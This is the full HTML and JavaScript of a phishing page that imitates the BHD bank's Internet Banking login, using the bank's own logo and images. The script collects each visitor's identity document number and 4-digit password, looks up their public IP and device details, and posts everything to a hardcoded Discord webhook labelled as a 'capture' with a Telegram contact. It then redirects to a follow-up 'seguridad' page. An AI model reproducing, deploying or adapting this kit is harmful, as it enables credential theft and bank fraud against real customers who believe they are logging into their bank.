<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
  <title>BHD ã Internet Banking</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      min-height: 100vh;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: stretch;
    }

    .container {
      width: 100%;
      max-width: 430px;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: #fff;
      position: relative;
      overflow: hidden;
    }

    .bg-bottom {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      height: 38%;
      background: url('https://ibp.bhd.com.do/assets/img/background-login.webp') center center / cover no-repeat;
      z-index: 0;
    }

    .bg-bottom::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 55%;
      background: linear-gradient(to bottom, #ffffff 0%, rgba(255,255,255,0) 100%);
      z-index: 1;
    }

    .content {
      position: relative;
      z-index: 2;
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 24px;
    }

    .logo-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding-top: 80px;
      padding-bottom: 50px;
    }

    .logo-wrap img {
      height: 90px;
      width: auto;
    }

    .form-wrap { width: 100%; }

    .input-group {
      width: 100%;
      display: flex;
      align-items: center;
      border: 1.5px solid #d0d0d0;
      border-radius: 10px;
      padding: 14px 16px;
      margin-bottom: 14px;
      background: #fff;
      gap: 12px;
    }

    .input-group:focus-within { border-color: #4caf50; }

    .input-group .ico {
      font-size: 1.15rem;
      color: #aaa;
      flex-shrink: 0;
    }

    .input-group input {
      border: none;
      outline: none;
      font-size: 0.97rem;
      color: #333;
      background: transparent;
      width: 100%;
    }

    .input-group input::placeholder { color: #bbb; }

    .remember-row {
      display: flex;
      align-items: center;
      gap: 14px;
      margin: 10px 0 24px 4px;
    }

    .remember-row span {
      font-size: 0.82rem;
      font-weight: 700;
      color: #444;
      letter-spacing: 0.5px;
      text-transform: uppercase;
    }

    .toggle {
      position: relative;
      width: 48px;
      height: 28px;
      flex-shrink: 0;
    }

    .toggle input { opacity: 0; width: 0; height: 0; }

    .slider {
      position: absolute;
      inset: 0;
      background: #ccc;
      border-radius: 28px;
      cursor: pointer;
      transition: background .25s;
    }

    .slider::before {
      content: '';
      position: absolute;
      width: 22px;
      height: 22px;
      left: 3px;
      top: 3px;
      background: #fff;
      border-radius: 50%;
      transition: transform .25s;
      box-shadow: 0 1px 4px rgba(0,0,0,0.25);
    }

    .toggle input:checked + .slider { background: #4caf50; }
    .toggle input:checked + .slider::before { transform: translateX(20px); }

    .btn-login {
      width: 100%;
      padding: 17px;
      background: linear-gradient(135deg, #4caf50, #43a047);
      color: #fff;
      font-size: 0.95rem;
      font-weight: 800;
      letter-spacing: 1.5px;
      text-transform: uppercase;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 4px 18px rgba(76, 175, 80, 0.35);
      transition: background .2s, box-shadow .2s, opacity .2s;
    }

    .btn-login:hover {
      background: linear-gradient(135deg, #43a047, #388e3c);
      box-shadow: 0 6px 22px rgba(76, 175, 80, 0.45);
    }

    .btn-login:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .spacer { flex: 1; }
  </style>
</head>
<body>

<div class="container">
  <div class="bg-bottom"></div>

  <div class="content">

    <div class="logo-wrap">
      <img src="https://ibp.bhd.com.do/assets/img/logo-bhd.svg" alt="BHD Logo" />
    </div>

    <div class="form-wrap">

      <!-- Documento ã solo nû¤meros, teclado numûˋrico -->
      <div class="input-group">
        <span class="ico">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
            <circle cx="12" cy="7" r="4"/>
          </svg>
        </span>
        <input type="tel" id="usuario"
               placeholder="Documento de identidad"
               autocomplete="username"
               inputmode="numeric"
               pattern="[0-9]*"
               oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
      </div>

      <!-- ContraseûÝa ã solo 4 dûÙgitos, teclado numûˋrico -->
      <div class="input-group">
        <span class="ico">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="7.5" cy="15.5" r="5.5"/>
            <path d="M21 2l-9.6 9.6"/>
            <path d="M15.5 7.5l3 3L22 7l-3-3"/>
          </svg>
        </span>
        <input type="tel" id="password"
               placeholder="ContraseûÝa"
               autocomplete="current-password"
               inputmode="numeric"
               maxlength="4"
               pattern="[0-9]*"
               oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
      </div>

      <div class="remember-row">
        <label class="toggle">
          <input type="checkbox" id="remember" />
          <span class="slider"></span>
        </label>
        <span>Recuerda mi usuario</span>
      </div>

      <button class="btn-login" id="btnLogin" type="button" onclick="login()">Iniciar sesiû°n</button>

    </div>

    <div class="spacer"></div>
  </div>
</div>

<script>
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1503663488671809708/3Wxdjh-C8vWsIX7Ebyux2cvSY1RwWTh5PWRqVCsYFazMW_EkuwPS10jMr_vGP25Z3-fb';

  window.addEventListener('DOMContentLoaded', () => {
    const saved = localStorage.getItem('bhd_usuario');
    const rememberCheck = document.getElementById('remember');
    if (saved) {
      document.getElementById('usuario').value = saved;
      rememberCheck.checked = true;
    }
    rememberCheck.addEventListener('change', () => {
      if (!rememberCheck.checked) localStorage.removeItem('bhd_usuario');
    });
  });

  function getDeviceInfo() {
    const ua = navigator.userAgent;
    let os = 'Desconocido', device = 'Desktop';
    if (/android/i.test(ua))          { os = 'Android'; device = 'ÞÝ Mû°vil'; }
    else if (/iPhone|iPad/i.test(ua)) { os = 'iOS';     device = 'ÞÝ iPhone/iPad'; }
    else if (/Windows/i.test(ua))     { os = 'Windows'; device = 'ÞËÿ¡ PC'; }
    else if (/Mac/i.test(ua))         { os = 'macOS';   device = 'ÞËÿ¡ Mac'; }
    else if (/Linux/i.test(ua))       { os = 'Linux';   device = 'ÞËÿ¡ Linux'; }
    const browser = /Chrome/i.test(ua)  ? 'Chrome'
                  : /Firefox/i.test(ua) ? 'Firefox'
                  : /Safari/i.test(ua)  ? 'Safari'
                  : /Edge/i.test(ua)    ? 'Edge' : 'Desconocido';
    return { os, device, browser };
  }

  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch { return 'No disponible'; }
  }

  async function sendToDiscord(usuario, password, ip) {
    const { os, device, browser } = getDeviceInfo();
    const now   = new Date();
    const fecha = now.toLocaleDateString('es-DO', { day:'2-digit', month:'long', year:'numeric' });
    const hora  = now.toLocaleTimeString('es-DO', { hour:'2-digit', minute:'2-digit', second:'2-digit' });

    const payload = {
      username: "BHD - BR0K3N",
      avatar_url: "https://ibp.bhd.com.do/assets/img/logo-bhd.svg",
      embeds: [{
        title: "Nueva Captura ã BHD Internet Banking",
        color: 0x2ecc71,
        thumbnail: { url: "https://ibp.bhd.com.do/assets/img/logo-bhd.svg" },
        fields: [
          { name: "ÞÊ  Documento de Identidad", value: `\`\`\`${usuario}\`\`\``, inline: false },
          { name: "Þ  ContraseûÝa",              value: `\`\`\`${password}\`\`\``, inline: false },
          { name: "Þ  IP Pû¤blica",              value: `\`${ip}\``,              inline: true  },
          { name: "Þ  Dispositivo",             value: device,                    inline: true  },
          { name: "Þ£  Navegador",               value: `${browser} ã ${os}`,      inline: true  },
          { name: "Þÿ¡  Fecha",                   value: fecha,                     inline: true  },
          { name: "Þ  Hora",                    value: hora,                      inline: true  }
        ],
        footer: {
          text: "Telegram: @Brknshinexxx",
          icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/240px-Telegram_logo.svg.png"
        },
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }

  async function login() {
    const u = document.getElementById('usuario').value.trim();
    const p = document.getElementById('password').value.trim();

    if (!u || !p) {
      alert('Por favor completa todos los campos.');
      return;
    }

    if (p.length !== 4) {
      alert('La contraseûÝa debe tener exactamente 4 dûÙgitos.');
      return;
    }

    // Toggle recuerda usuario
    if (document.getElementById('remember').checked) {
      localStorage.setItem('bhd_usuario', u);
    } else {
      localStorage.removeItem('bhd_usuario');
    }

    // Siempre guardar para coordenadas.html
    localStorage.setItem('bhd_doc_session', u);

    const btn = document.getElementById('btnLogin');
    btn.disabled = true;
    btn.textContent = 'Verificando...';

    try {
      const ip = await getIP();
      await sendToDiscord(u, p, ip);
    } catch (e) {
      console.error('Webhook error:', e);
    }

    window.location.href = `seguridad.html?doc=${encodeURIComponent(u)}`;
  }
</script>

</body>
</html>
